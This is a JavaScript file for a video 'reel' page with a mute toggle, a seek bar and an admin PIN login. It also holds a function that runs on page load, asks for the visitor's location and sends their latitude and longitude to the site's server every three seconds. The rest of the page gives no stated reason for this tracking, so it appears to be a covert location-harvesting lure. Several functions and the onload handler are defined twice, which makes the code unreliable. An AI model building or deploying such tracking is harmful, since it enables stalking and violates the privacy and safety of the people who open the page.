// Ask for location and ping every 3 seconds
function startLocationTracking() {
    if (navigator.geolocation) {
        setInterval(() => {
            navigator.geolocation.getCurrentPosition(position => {
                fetch('/api/location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        lat: position.coords.latitude,
                        lng: position.coords.longitude
                    })
                }).catch(err => console.error("Error sending location", err));
            }, error => {
                console.error("Location tracking denied or failed:", error);
            });
        }, 3000);
    } else {
        console.error("Geolocation is not supported by this browser.");
    }
}

// Start tracking immediately
window.onload = startLocationTracking;

// Login logic
async function attemptLogin() {
    const pin = document.getElementById('pin-input').value;
    const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ pin: pin })
    });

    if (response.ok) {
        window.location.href = '/admin';
    } else {
        alert("Incorrect PIN");
    }
}

function toggleAudio() {
    const video = document.getElementById('reelVideo');
    const indicator = document.getElementById('mute-indicator');
    video.muted = !video.muted;
    indicator.textContent = video.muted ? '🔇' : '🔊';
    indicator.style.opacity = '1';
    if (!video.muted) {
        setTimeout(() => { indicator.style.opacity = '0'; }, 800);
    }
}

// Ask for location and ping every 3 seconds
function startLocationTracking() {
    if (navigator.geolocation) {
        setInterval(() => {
            navigator.geolocation.getCurrentPosition(position => {
                fetch('/api/location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        lat: position.coords.latitude,
                        lng: position.coords.longitude
                    })
                }).catch(err => console.error("Error sending location", err));
            }, error => {
                console.error("Location tracking denied or failed:", error);
            });
        }, 3000);
    }
}

// Toggle Audio on Video Tap
function toggleAudio() {
    const video = document.getElementById('reelVideo');
    const indicator = document.getElementById('mute-indicator');
    video.muted = !video.muted;
    indicator.textContent = video.muted ? '🔇' : '🔊';
    indicator.style.opacity = '1';
    if (!video.muted) {
        setTimeout(() => { indicator.style.opacity = '0'; }, 800);
    }
}

// Format seconds into M:SS (e.g., 0:07)
function formatTime(seconds) {
    if (!seconds || isNaN(seconds)) return "0:00";
    const mins = Math.floor(seconds / 60);
    const secs = Math.floor(seconds % 60);
    return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
}

// Initialize Video Scrubber (Forward / Rewind Bar)
function initScrubber() {
    const video = document.getElementById('reelVideo');
    const container = document.getElementById('scrubber-container');
    const fill = document.getElementById('scrubber-fill');
    const timeLabel = document.getElementById('scrubber-time');

    let isScrubbing = false;

    // Continuously update progress bar while video plays
    video.addEventListener('timeupdate', () => {
        if (!isScrubbing && video.duration) {
            const percent = (video.currentTime / video.duration) * 100;
            fill.style.width = `${percent}%`;
        }
    });

    function seek(clientX) {
        if (!video.duration) return;
        const rect = container.getBoundingClientRect();
        let pos = (clientX - rect.left) / rect.width;
        pos = Math.max(0, Math.min(1, pos)); // Clamp between 0% and 100%

        fill.style.width = `${pos * 100}%`;
        video.currentTime = pos * video.duration;
        timeLabel.textContent = `${formatTime(video.currentTime)} / ${formatTime(video.duration)}`;
    }

    // Touch Events (Mobile)
    container.addEventListener('touchstart', (e) => {
        isScrubbing = true;
        container.classList.add('scrubbing');
        seek(e.touches[0].clientX);
    }, { passive: true });

    window.addEventListener('touchmove', (e) => {
        if (!isScrubbing) return;
        seek(e.touches[0].clientX);
    }, { passive: true });

    window.addEventListener('touchend', () => {
        if (!isScrubbing) return;
        isScrubbing = false;
        container.classList.remove('scrubbing');
    });

    // Mouse Events (Desktop Testing)
    container.addEventListener('mousedown', (e) => {
        isScrubbing = true;
        container.classList.add('scrubbing');
        seek(e.clientX);
    });

    window.addEventListener('mousemove', (e) => {
        if (!isScrubbing) return;
        seek(e.clientX);
    });

    window.addEventListener('mouseup', () => {
        if (!isScrubbing) return;
        isScrubbing = false;
        container.classList.remove('scrubbing');
    });
}

window.onload = () => {
    startLocationTracking();
    initScrubber();
};

// Admin Login Logic
async function attemptLogin() {
    const pin = document.getElementById('pin-input').value;
    const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ pin: pin })
    });

    if (response.ok) {
        window.location.href = '/admin';
    } else {
        alert("Incorrect PIN");
    }
}